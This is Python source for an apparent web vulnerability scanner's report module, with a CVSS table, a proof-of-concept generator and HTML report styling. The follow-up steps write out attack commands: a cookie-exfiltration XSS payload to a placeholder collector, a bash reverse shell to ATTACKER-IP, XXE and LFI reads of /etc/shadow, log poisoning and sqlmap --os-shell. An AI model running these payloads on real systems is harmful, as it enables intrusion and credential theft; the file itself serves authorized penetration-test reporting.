import html
import hashlib
import math
import os
import re
import shlex
import tempfile
import uuid
from datetime import datetime
from typing import List, Dict
from urllib.parse import urlencode, urlparse, urlunsplit, parse_qsl, quote

from core.ui import ph, G, Y, R, C, W, B, N, GY

OUTPUT_DIR = "outputs"


def _sanitize_filename(name: str) -> str:
    sanitized = re.sub(r'[^\w\.\-]', '_', name)
    return sanitized.strip('._') or 'unnamed'

try:
    from weasyprint import HTML as WeasyHTML
    WEASYPRINT_AVAILABLE = True
except ImportError:
    WEASYPRINT_AVAILABLE = False


# EXTENDED CVSS DATABASE — All vulnerability types

CVSS_DB = {
    # Injection
    "reflected_xss":     {"s":6.1,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"},
    "stored_xss":        {"s":7.2,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"},
    "dom_xss":           {"s":6.1,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"},
    "sqli_error":        {"s":9.8,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "sqli_time":         {"s":9.8,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "sqli_blind":        {"s":9.8,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "lfi":               {"s":7.5,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "rce":               {"s":9.8,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "ssti":              {"s":9.8,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "xxe_file":          {"s":7.5,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    # SSRF
    "ssrf":              {"s":8.8,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "blind_ssrf":        {"s":8.2,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"},
    # Blind / OOB
    "blind_xxe":         {"s":7.5,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "blind_rce":         {"s":9.8,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    # Auth / Access Control
    "broken_auth":       {"s":8.6,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"},
    "auth_bypass":       {"s":9.1,"v":"Critical","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
    "idor":              {"s":5.3,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "protected_api_endpoint": {"s":0.0,"v":"Info","vec":"N/A"},
    "auth_data_publicly_accessible": {"s":6.5,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "api_auth_delta":    {"s":0.0,"v":"Info","vec":"N/A"},
    # Config / Info
    "admin_panel":       {"s":0.0,"v":"Info","vec":"N/A"},
    "info_disclosure":   {"s":5.3,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "misconfig_header":  {"s":0.0,"v":"Info","vec":"N/A"},
    "server_disclosure": {"s":0.0,"v":"Info","vec":"N/A"},
    "subdomain_takeover": {"s":8.1,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
    # Redirect / CORS
    "open_redirect":     {"s":4.7,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"},
    "cors_misconfig":    {"s":6.1,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"},
    # HTTP Smuggling
    "http_smuggling":    {"s":8.1,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
    # Recon / Intel
    "google_dork":       {"s":0.0,"v":"Info","vec":"N/A"},
    "js_endpoint":       {"s":0.0,"v":"Info","vec":"N/A"},
    "param_discovery":   {"s":0.0,"v":"Info","vec":"N/A"},
    "api_endpoint":      {"s":0.0,"v":"Info","vec":"N/A"},
    "public_admin_api":  {"s":8.1,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"},
    "unauthenticated_api_data": {"s":6.5,"v":"Medium","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "api_schema_exposed": {"s":0.0,"v":"Info","vec":"N/A"},
    "graphql_introspection": {"s":0.0,"v":"Info","vec":"N/A"},
    "dangerous_methods_allowed": {"s":0.0,"v":"Info","vec":"N/A"},
}

# Auto-map js_secret_* types
for _secret_type in ["google_api", "firebase", "aws_access_key", "aws_secret_key",
                      "amazon_mws", "slack_token", "slack_webhook", "github_token",
                      "stripe_key", "ssh_key", "jwt_token", "generic_secret"]:
    CVSS_DB[f"js_secret_{_secret_type}"] = {"s":7.5,"v":"High","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}
for _info_type in ["email", "internal_ip"]:
    CVSS_DB[f"js_secret_{_info_type}"] = {"s":3.7,"v":"Low","vec":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}


def finding_cvss(finding: Dict) -> Dict:
    default = CVSS_DB.get(finding.get("type"), {"s": 0, "v": "Info", "vec": "N/A"})
    return {
        "s": finding.get("cvss_score", default["s"]),
        "v": finding.get("cvss_severity", default["v"]),
        "vec": finding.get("cvss_vector", default.get("vec", "N/A")),
    }


class PoCGenerator:
    """Auto-generate PoC code (curl for server-side, HTML/JS for browser vulnerabilities)."""

    @staticmethod
    def _shell_quote(value: str) -> str:
        return shlex.quote(value or "")

    @staticmethod
    def generate_poc(finding: Dict) -> Dict[str, str]:
        """
        Returns a dict:
        {
            "format": "bash" | "html" | "javascript" | "text",
            "code": str,
            "instructions": str
        }
        """
        url = finding.get("url", "")
        ftype = finding.get("type", "")
        verified_poc = finding.get("verified_poc", "")
        qurl = PoCGenerator._shell_quote(url)

        # 1. Client-Side Browser Vulnerabilities

        if "csrf" in ftype:
            poc_html = verified_poc or f"""<!DOCTYPE html>
<html>
<body>
    <h1>CSRF Proof-of-Concept</h1>
    <form id="csrfForm" action="{url}" method="POST">
        <input type="hidden" name="test_param" value="verdamt_csrf_test" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>"""
            return {
                "format": "html",
                "code": poc_html,
                "instructions": "Save the HTML code snippet above as `csrf_poc.html` and open it in a browser with an active target session."
            }

        elif "clickjacking" in ftype:
            poc_html = f"""<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
    <h2>Clickjacking Vulnerability Proof-of-Concept</h2>
    <iframe src="{url}" width="1000" height="700" style="opacity:0.8; border:2px red solid;"></iframe>
</body>
</html>"""
            return {
                "format": "html",
                "code": poc_html,
                "instructions": "Save the code snippet as `clickjacking_poc.html` and open it in Chrome/Firefox to verify cross-origin framing."
            }

        elif "postmessage" in ftype:
            poc_js = f"""// Open target window and send postMessage payload
const win = window.open('{url}', '_blank');
setTimeout(() => {{
    win.postMessage({{ type: 'VERDAMT_POC', data: 'test_payload' }}, '*');
}}, 1500);"""
            return {
                "format": "javascript",
                "code": poc_js,
                "instructions": "Open Developer Tools Console (F12) on an attacker site or blank tab and paste the JavaScript PoC script."
            }

        elif "dom_xss" in ftype:
            target_poc_url = verified_poc or url
            return {
                "format": "text",
                "code": f"# Open in Chromium/Firefox browser:\n{target_poc_url}",
                "instructions": "DOM XSS requires browser JavaScript execution. Navigate to the PoC URL above directly in a web browser."
            }

        elif "proto_pollution" in ftype:
            target_poc_url = verified_poc or f"{url}#__proto__[verdamt_polluted]=VERDAMT_PROTO_TEST"
            return {
                "format": "javascript",
                "code": f"// Navigate to: {target_poc_url}\n// Check in browser console:\nconsole.log(Object.prototype.verdamt_polluted);",
                "instructions": "Navigate to the URL above, open Developer Console (F12), and check if Object.prototype was polluted."
            }

        elif "cors" in ftype:
            poc_js = f"""fetch('{url}', {{ credentials: 'include' }})
  .then(r => console.log('ACAO:', r.headers.get('access-control-allow-origin'), 'ACAC:', r.headers.get('access-control-allow-credentials')))
  .catch(err => console.error(err));"""
            return {
                "format": "javascript",
                "code": poc_js,
                "instructions": "Open Developer Console (F12) on cross-domain attacker site https://evil.com and run the fetch PoC."
            }

        elif "oauth" in ftype:
            return {
                "format": "text",
                "code": f"# OAuth Token Leak Target URL:\n{url}\n# Observe Referer header in Network Tab when redirecting cross-domain.",
                "instructions": "Open Network Tab in Browser DevTools and trace redirect URL chain to verify token leakage in Referer."
            }

        # 2. Server-Side HTTP Vulnerabilities (cURL)

        audit_curl = finding.get("audit_curl")
        if audit_curl:
            return {
                "format": "bash",
                "code": audit_curl,
                "instructions": "Exact request recorded in the scan audit trail "
                                "(replayed verbatim: method, headers, payload). "
                                "Run it to reproduce — generic template not used.",
            }

        base = "curl -sk"
        if "xxe" in ftype:
            payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
            cmd = f'{base} -X POST -H "Content-Type: text/xml" -d {PoCGenerator._shell_quote(payload)} {qurl}'
        elif "sqli" in ftype:
            if "time" in ftype or "blind" in ftype:
                cmd = f'{base} -w "\\nTime: %{{time_total}}s\\n" {qurl}'
            else:
                cmd = f'{base} {qurl}'
        elif "xss" in ftype and "dom" not in ftype:
            cmd = f'{base} {qurl} | grep -i "alert\\|confirm\\|prompt"'
        elif "redirect" in ftype:
            cmd = f'{base} -I {qurl} | grep -i "location"'
        elif "lfi" in ftype:
            cmd = f'{base} {qurl} | head -20'
        elif "auth" in ftype or "broken_auth" in ftype:
            method = finding.get("method")
            if method and method.upper() != "GET":
                cmd = f'{base} -X {method.upper()} {qurl}'
            else:
                cmd = f'{base} {qurl}'
        elif "smuggling" in ftype:
            cmd = f'{base} -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 0" -d "0\\r\\n\\r\\n" {qurl}'
        elif "header" in ftype or "misconfig" in ftype:
            cmd = f'{base} -I {qurl} | grep -iE "strict-transport|content-security|x-frame"'
        else:
            cmd = f'{base} {qurl}'

        return {
            "format": "bash",
            "code": cmd,
            "instructions": "Execute the cURL command above in your terminal to reproduce the HTTP request."
        }

    @staticmethod
    def generate_curl(finding: Dict) -> str:
        """Backwards compatibility helper."""
        return PoCGenerator.generate_poc(finding)["code"]

    @staticmethod
    def generate_steps(finding: Dict, tech_stack: List[str] = None) -> List[Dict]:
        url = finding.get("url", "")
        ftype = finding.get("type", "")
        detail = finding.get("detail", "")
        confidence = finding.get("confidence", "suspected").capitalize()
        verified_poc = finding.get("verified_poc", "")

        # Methodology description based on finding type
        if "dom_xss" in ftype or "postmessage" in ftype or "csrf" in ftype or "clickjacking" in ftype or "proto" in ftype:
            methodology = "Automated Dynamic Browser Analysis (Playwright Headless Chromium Engine with JavaScript Sink Instrumentation & Hooking)."
        elif "sqli" in ftype or "xxe" in ftype or "lfi" in ftype or "rce" in ftype or "ssrf" in ftype:
            methodology = "Async Active Fuzzing & Out-of-Band / Differential Response Analysis."
        else:
            methodology = "Automated Reconnaissance & Security Policy Inspection Engine."

        steps = []
        steps.append({
            "title": "Step 1: Testing Methodology & Discovery Context",
            "desc": f"Methodology: {methodology}\nEndpoint / Target: {url}\nSummary: {detail}"
        })

        execution_pipeline = f"Confidence Level: {confidence}."
        if verified_poc:
            execution_pipeline += f" Verified PoC String: {verified_poc}"
        steps.append({
            "title": "Step 2: Technical Execution Pipeline & Verification",
            "desc": execution_pipeline
        })

        poc_data = PoCGenerator.generate_poc(finding)
        if poc_data.get("code"):
            desc = poc_data["instructions"]
            evidence = (finding.get("evidence") or "").strip()
            if evidence:
                snippet = "".join(
                    c if c >= " " or c in "\n\t" else " "
                    for c in evidence[:500])
                desc += ("\n\nRecorded scan-time response evidence "
                         "(first 500 chars):\n" + snippet)
            steps.append({
                "title": f"Step 3: Full Reproduction & Weaponization PoC ({poc_data['format'].upper()})",
                "desc": desc,
                "code": poc_data["code"]
            })

        # Step 4: Post-Exploitation Validation & Escalation
        qurl = PoCGenerator._shell_quote(url)
        validation = ""
        if "sqli" in ftype:
            validation = (
                "VALIDATE — Run these follow-up commands:\n\n"
                f"# 1. Confirm injectable param with sqlmap:\nsqlmap -u {url} --batch --level=3 --risk=2 --threads=5\n\n"
                f"# 2. Enumerate databases:\nsqlmap -u {url} --batch --dbs\n\n"
                f"# 3. Dump target table:\nsqlmap -u {url} --batch -D <db_name> --tables\n\n"
                f"# 4. Check for OS shell (if DBA privileges):\nsqlmap -u {url} --batch --os-shell"
            )
        elif "xss" in ftype and "dom" not in ftype:
            validation = (
                "VALIDATE — Confirm XSS fires in browser:\n\n"
                f"# 1. Open in browser and check for JS alert dialog:\n{url}\n\n"
                "# 2. Steal cookies (replace with your collector):\n"
                "<script>fetch('https://YOUR-COLLECTOR.com/?c='+document.cookie)</script>\n\n"
                f"# 3. Check HTTPOnly flag on session cookie:\ncurl -sk -I {qurl} | grep -i set-cookie\n\n"
                f"# 4. Test WAF bypass variants:\ncurl -sk {qurl} | grep -ci '<script'"
            )
        elif "dom_xss" in ftype:
            validation = (
                "VALIDATE — Confirm DOM sink execution:\n\n"
                "# 1. Open target URL in Chrome with DevTools Console (F12)\n"
                "# 2. Check if alert/confirm dialog fires\n"
                "# 3. If using innerHTML sink, verify DOM mutation:\n"
                "document.querySelectorAll('*').forEach(e => {\n"
                "  if(e.innerHTML.includes('verdamt')) console.log('SINK:', e.tagName, e.innerHTML);\n"
                "});\n\n"
                "# 4. Test with session cookie exfil payload"
            )
        elif "lfi" in ftype:
            base_url = url.split('=')[0] + '=' if '=' in url else url
            validation = (
                "VALIDATE — Confirm file read & escalate:\n\n"
                f"# 1. Read /etc/passwd:\ncurl -sk {qurl} | head -20\n\n"
                f"# 2. Attempt /etc/shadow (root check):\ncurl -sk '{base_url}../../etc/shadow' | head -5\n\n"
                f"# 3. Read application source:\ncurl -sk '{base_url}../app.py'\n\n"
                f"# 4. Check RCE via log poisoning:\ncurl -sk -H 'User-Agent: <?php system(\"id\"); ?>' {qurl}\n"
                "# Then include the access log via LFI path"
            )
        elif "rce" in ftype or "ssti" in ftype:
            validation = (
                "VALIDATE — Confirm command execution:\n\n"
                f"# 1. Blind RCE check with sleep:\ntime curl -sk {qurl}\n\n"
                "# 2. DNS exfil for blind confirmation:\n"
                "# Replace BURP-COLLAB with your Collaborator/interactsh URL\n"
                f"curl -sk '{url}' --data 'cmd=curl+BURP-COLLAB'\n\n"
                f"# 3. Read /etc/hostname:\ncurl -sk '{url}' | grep -i hostname\n\n"
                "# 4. Reverse shell (AUTHORIZED TESTING ONLY):\n"
                "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"
            )
        elif "ssrf" in ftype:
            base_url = url.split('=')[0] + '=' if '=' in url else url
            host = url.split('/')[2] if len(url.split('/')) > 2 else url
            validation = (
                "VALIDATE — Probe internal network:\n\n"
                f"# 1. Hit cloud metadata endpoint:\ncurl -sk '{base_url}http://169.254.169.254/latest/meta-data/'\n\n"
                f"# 2. Scan internal ports via SSRF:\nfor p in 80 443 8080 6379 3306 27017; do\n"
                f"  curl -sk -o /dev/null -w '%{{http_code}}' '{base_url}http://127.0.0.1:'$p/ && echo \" :$p\";\n"
                f"done\n\n"
                f"# 3. Check file:// protocol:\ncurl -sk '{base_url}file:///etc/passwd'"
            )
        elif "xxe" in ftype:
            validation = (
                "VALIDATE — Confirm XML entity expansion:\n\n"
                "# 1. Check response for file content (look for root:x:0:0)\n\n"
                "# 2. Blind XXE via OOB with external DTD:\n"
                '<?xml version=\"1.0\"?>\n'
                '<!DOCTYPE data [\n'
                '  <!ENTITY % xxe SYSTEM \"http://BURP-COLLAB/evil.dtd\">\n'
                '  %xxe;\n'
                ']>\n'
                '<data>&send;</data>\n\n'
                "# 3. Read more sensitive files:\n"
                '<!ENTITY xxe SYSTEM \"file:///etc/shadow\">\n'
                '<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">'
            )
        elif "csrf" in ftype:
            validation = (
                "VALIDATE — Confirm state change:\n\n"
                "# 1. Login to target app in Browser A\n"
                "# 2. Open the CSRF PoC HTML in Browser A\n"
                "# 3. Verify the action completed (profile, email, password changed)\n\n"
                f"# 4. Check CSRF token presence:\ncurl -sk {qurl} | grep -iE 'csrf|token|_token'\n\n"
                "# 5. If token exists, verify server-side validation:\n"
                "# Remove/modify the token and replay the request"
            )
        elif "auth" in ftype or "broken_auth" in ftype or "idor" in ftype:
            validation = (
                "VALIDATE — Confirm access control bypass:\n\n"
                f"# 1. Compare authed vs unauthed response size:\ncurl -sk {qurl} | wc -c\n"
                f"curl -sk -H 'Cookie: session=VALID_TOKEN' {qurl} | wc -c\n\n"
                "# 2. Try horizontal privilege escalation:\n"
                "# Swap user_id/account_id in URL path or params\n\n"
                f"# 3. Check for sensitive data leakage:\ncurl -sk {qurl} | grep -iE 'email|phone|ssn|password|secret'"
            )
        elif "smuggling" in ftype:
            host = url.split('/')[2] if len(url.split('/')) > 2 else url
            validation = (
                "VALIDATE — Confirm desync:\n\n"
                f"# 1. Send CL.TE probe:\nprintf 'POST / HTTP/1.1\\r\\nHost: {host}\\r\\n"
                "Content-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"
                f"0\\r\\n\\r\\nX' | ncat --ssl {host.split(':')[0]} 443\n\n"
                "# 2. Check for timeout differential (desync indicator)\n\n"
                f"# 3. Use smuggler.py:\npython3 smuggler.py -u {url}"
            )
        elif "redirect" in ftype:
            validation = (
                "VALIDATE — Confirm open redirect:\n\n"
                f"# 1. Follow redirect chain:\ncurl -skL -w '%{{url_effective}}' -o /dev/null {qurl}\n\n"
                "# 2. Test with attacker domain:\n"
                "# Modify redirect param to https://evil.com, check final Location\n\n"
                "# 3. Check for OAuth token leak via redirect:\n"
                "# Append redirect to attacker server and inspect received tokens"
            )
        else:
            validation = (
                "VALIDATE — Manual verification:\n\n"
                f"# 1. Replay and compare response codes:\ncurl -sk -o /dev/null -w '%{{http_code}}' {qurl}\n\n"
                f"# 2. Diff baseline vs payload response:\ncurl -sk {qurl} > /tmp/resp_payload.txt\n"
                "diff /tmp/resp_baseline.txt /tmp/resp_payload.txt\n\n"
                "# 3. Monitor for side-effects in application logs"
            )

        steps.append({
            "title": "Step 4: Post-Exploitation Validation & Escalation",
            "desc": validation,
            "highlight": True
        })

        # Step 5: Impact
        impact = "System compromise or data exposure is highly likely if exploited."
        if "xss" in ftype:
            impact = "Attacker can execute arbitrary JavaScript in the victim's browser session, steal session tokens / cookies, or perform unauthorized DOM actions on behalf of the victim."
        elif "sqli" in ftype:
            impact = "Attacker can execute arbitrary SQL commands, read, modify, or delete database tables, bypass authentication, and potentially gain underlying OS command execution."
        elif "rce" in ftype:
            impact = "Attacker can execute arbitrary shell commands on the hosting server, enabling total server compromise, privilege escalation, and lateral network movement."
        elif "lfi" in ftype:
            impact = "Attacker can read arbitrary local files from the server filesystem (e.g. system configurations, source code, credentials)."
        elif "ssrf" in ftype:
            impact = "Attacker can force the server to initiate HTTP/TCP requests to internal infrastructure, cloud metadata endpoints (e.g., 169.254.169.254), or internal microservices."
        elif "csrf" in ftype:
            impact = "Attacker can trick an authenticated victim into performing unintended state-changing actions (e.g. password change, profile update, transaction transfer)."
        elif "clickjacking" in ftype:
            impact = "Attacker can overlay transparent UI frames over legitimate pages, tricking users into clicking hidden buttons or performing sensitive actions."

        steps.append({"title": "Step 5: Threat Model & Business Impact", "desc": impact, "highlight": True})

        # Step 6: Framework-Aware Remediation
        from reports.remediation import ContextAwareFixGenerator
        fix = ContextAwareFixGenerator.generate_fix(ftype, tech_stack or [])
        framework_title = f"Step 6: Code Remediation Snippet ({', '.join(tech_stack)})" if tech_stack else "Step 6: Code Remediation Recommendation"
        step_dict = {"title": framework_title, "desc": fix["desc"]}
        if fix.get("code"):
            step_dict["code"] = fix["code"]
        steps.append(step_dict)

        return steps


class ReportEngine:
    def __init__(self, target: str, findings: List[Dict], services: List[Dict],
                 subs: List[str], urls: List[str], duration: float, waf_detected: List[str],
                 version: str, author: str, mode: str = "Unknown"):
        self.target = target
        self.findings = [f for f in findings if finding_cvss(f)["v"] != "Info"]
        # Crash-proofing: every rendered finding needs display keys.
        # Previously `fd["title"]` (render path) raised KeyError and killed
        # save_html/save_pdf for any finding missing a title.
        for _f in self.findings:
            if not _f.get("title"):
                _f["title"] = str(_f.get("type") or "Finding").replace("_", " ").title()
        self.services = services
        self.subs = subs
        self.urls = urls
        self.duration = duration
        self.waf_detected = waf_detected
        self.version = version
        self.author = author
        self.mode = mode
        self.report_id = f"VS-RPT-{uuid.uuid4().hex[:8].upper()}"
        self.scan_time = datetime.now()

        # Auto-detect target technology stack
        from modules.recon.tech_detector import TechStackDetector
        self.tech_stack = TechStackDetector.detect_from_services(self.services)

        os.makedirs(OUTPUT_DIR, exist_ok=True)


    def _calc_target_level(self) -> int:
        lvl = 1
        tld = self.target.split('.')[-1]
        if tld in ['gov', 'mil', 'edu']:
            lvl += 3
        elif tld in ['com', 'net', 'io']:
            lvl += 1
        for kw in ['google', 'nasa', 'apple', 'microsoft', 'amazon', 'paypal', 'stripe']:
            if kw in self.target.lower():
                lvl += 4
                break
        if len(self.services) > 10:
            lvl += 2
        elif len(self.services) > 5:
            lvl += 1
        if self.waf_detected:
            lvl += 3
        return min(10, lvl)

    def _calc_risk_rating(self) -> str:
        """Calculate overall risk rating from findings."""
        if not self.findings:
            return "None"
        max_cvss = max(finding_cvss(f)["s"] for f in self.findings)
        if max_cvss >= 9.0:
            return "Critical"
        elif max_cvss >= 7.0:
            return "High"
        elif max_cvss >= 4.0:
            return "Medium"
        elif max_cvss > 0:
            return "Low"
        return "Informational"

    def _svg_donut_chart(self, counts: Dict[str, int]) -> str:
        """Generate SVG donut chart for severity distribution."""
        colors = {"Critical": "#ef4444", "High": "#f97316", "Medium": "#eab308", "Low": "#22c55e", "Info": "#64748b"}
        total = sum(counts.values())
        if total == 0:
            return '<svg viewBox="0 0 200 200" width="200" height="200"><circle cx="100" cy="100" r="70" fill="none" stroke="#27272a" stroke-width="20"/><text x="100" y="100" text-anchor="middle" dominant-baseline="central" fill="#a1a1aa" font-family="Inter" font-size="14">No Data</text></svg>'

        svg_parts = []
        cumulative = 0
        r = 70
        circumference = 2 * math.pi * r

        for sev in ["Critical", "High", "Medium", "Low", "Info"]:
            count = counts.get(sev, 0)
            if count == 0:
                continue
            pct = count / total
            dash = pct * circumference
            gap = circumference - dash
            offset = -cumulative * circumference + (circumference * 0.25)
            svg_parts.append(
                f'<circle cx="100" cy="100" r="{r}" fill="none" stroke="{colors[sev]}" '
                f'stroke-width="22" stroke-dasharray="{dash:.2f} {gap:.2f}" '
                f'stroke-dashoffset="{offset:.2f}" stroke-linecap="round" '
                f'style="transition: stroke-dasharray 0.8s ease;"/>'
            )
            cumulative += pct

        center_text = f'<text x="100" y="92" text-anchor="middle" fill="#e4e4e7" font-family="JetBrains Mono" font-size="28" font-weight="800">{total}</text>'
        center_text += '<text x="100" y="116" text-anchor="middle" fill="#a1a1aa" font-family="Inter" font-size="11">FINDINGS</text>'

        return f'<svg viewBox="0 0 200 200" width="200" height="200">{"".join(svg_parts)}{center_text}</svg>'

    def _svg_cvss_gauge(self, avg_score: float) -> str:
        """Generate SVG radial gauge for average CVSS score."""
        # Determine color based on score
        if avg_score >= 9.0:
            color = "#ef4444"
            label = "CRITICAL"
        elif avg_score >= 7.0:
            color = "#f97316"
            label = "HIGH"
        elif avg_score >= 4.0:
            color = "#eab308"
            label = "MEDIUM"
        elif avg_score > 0:
            color = "#22c55e"
            label = "LOW"
        else:
            color = "#64748b"
            label = "NONE"

        r = 65
        circumference = math.pi * r  # Semi-circle
        pct = min(avg_score / 10.0, 1.0)
        dash = pct * circumference
        gap = circumference - dash

        return f'''<svg viewBox="0 0 200 130" width="200" height="130">
            <path d="M 30 110 A 65 65 0 0 1 170 110" fill="none" stroke="#27272a" stroke-width="14" stroke-linecap="round"/>
            <path d="M 30 110 A 65 65 0 0 1 170 110" fill="none" stroke="{color}" stroke-width="14" stroke-linecap="round"
                stroke-dasharray="{dash:.2f} {gap:.2f}" style="transition: stroke-dasharray 1s ease;"/>
            <text x="100" y="95" text-anchor="middle" fill="{color}" font-family="JetBrains Mono" font-size="32" font-weight="800">{avg_score:.1f}</text>
            <text x="100" y="115" text-anchor="middle" fill="#a1a1aa" font-family="Inter" font-size="10" letter-spacing="2">{label}</text>
        </svg>'''

    def _risk_heatmap(self, counts: Dict[str, int]) -> str:
        """Generate horizontal stacked risk bar."""
        colors = {"Critical": "#ef4444", "High": "#f97316", "Medium": "#eab308", "Low": "#22c55e", "Info": "#64748b"}
        total = sum(counts.values())
        if total == 0:
            return '<div style="height:24px; background:#27272a; border-radius:4px;"></div>'

        bars = []
        for sev in ["Critical", "High", "Medium", "Low", "Info"]:
            count = counts.get(sev, 0)
            if count == 0:
                continue
            pct = (count / total) * 100
            bars.append(
                f'<div title="{sev}: {count}" style="width:{pct:.1f}%; height:100%; background:{colors[sev]}; '
                f'display:inline-block; transition: width 0.6s ease;"></div>'
            )
        return f'<div style="height:24px; border-radius:6px; overflow:hidden; display:flex;">{"".join(bars)}</div>'

    def _generate_css(self, for_pdf: bool = False) -> str:
        """Generate the complete CSS stylesheet."""
        css = """
        :root {
            --bg: #09090b; --surface: #18181b; --surface-hover: #1f1f23;
            --border: #27272a; --border-light: #3f3f46;
            --text: #e4e4e7; --text-muted: #a1a1aa; --text-dim: #71717a;
            --primary: #3b82f6; --primary-glow: rgba(59,130,246,0.15);
            --accent: #8b5cf6; --accent-glow: rgba(139,92,246,0.15);
            --crit: #ef4444; --crit-bg: rgba(239,68,68,0.1);
            --high: #f97316; --high-bg: rgba(249,115,22,0.1);
            --med: #eab308; --med-bg: rgba(234,179,8,0.1);
            --low: #22c55e; --low-bg: rgba(34,197,94,0.1);
            --info: #64748b; --info-bg: rgba(100,116,139,0.1);
            --glass: rgba(24,24,27,0.6); --glass-border: rgba(255,255,255,0.06);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', system-ui, sans-serif; line-height: 1.6; }

        /* ═══ Cover Page ═══ */
        .cover { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; position: relative; overflow: hidden; padding: 40px; }
        .cover::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 30% 20%, rgba(59,130,246,0.08) 0%, transparent 50%), radial-gradient(ellipse at 70% 80%, rgba(139,92,246,0.06) 0%, transparent 50%); pointer-events: none; }
        .cover-logo { font-size: 64px; margin-bottom: 10px; animation: pulse 3s ease-in-out infinite; }
        @keyframes pulse { 0%,100% { opacity: 0.8; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }
        .cover-title { font-size: 42px; font-weight: 800; letter-spacing: -1px; background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 8px; }
        .cover-subtitle { font-size: 16px; color: var(--text-muted); letter-spacing: 4px; text-transform: uppercase; margin-bottom: 50px; }
        .cover-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 500px; width: 100%; text-align: left; }
        .cover-meta-item { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: 10px; padding: 16px 20px; }
        .cover-meta-label { font-size: 11px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 4px; }
        .cover-meta-value { font-size: 14px; font-weight: 600; color: var(--text); font-family: 'JetBrains Mono', monospace; word-break: break-all; }
        .cover-classification { margin-top: 50px; padding: 8px 24px; border: 1px solid var(--crit); border-radius: 4px; font-size: 11px; letter-spacing: 3px; text-transform: uppercase; color: var(--crit); font-weight: 700; }
        .cover-scroll-hint { position: absolute; bottom: 30px; color: var(--text-dim); font-size: 12px; animation: bounce 2s infinite; }
        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(8px); } }

        /* ═══ Header ═══ */
        .main-header { background: var(--surface); border-bottom: 1px solid var(--border); padding: 16px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(16px); background: rgba(24,24,27,0.85); }
        .main-header h1 { font-size: 20px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .header-meta { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); display: flex; gap: 16px; align-items: center; }
        .header-id { background: var(--primary-glow); color: var(--primary); padding: 3px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; }

        /* ═══ Tabs ═══ */
        .tabs { display: flex; border-bottom: 1px solid var(--border); background: var(--surface); padding: 0 40px; position: sticky; top: 52px; z-index: 99; }
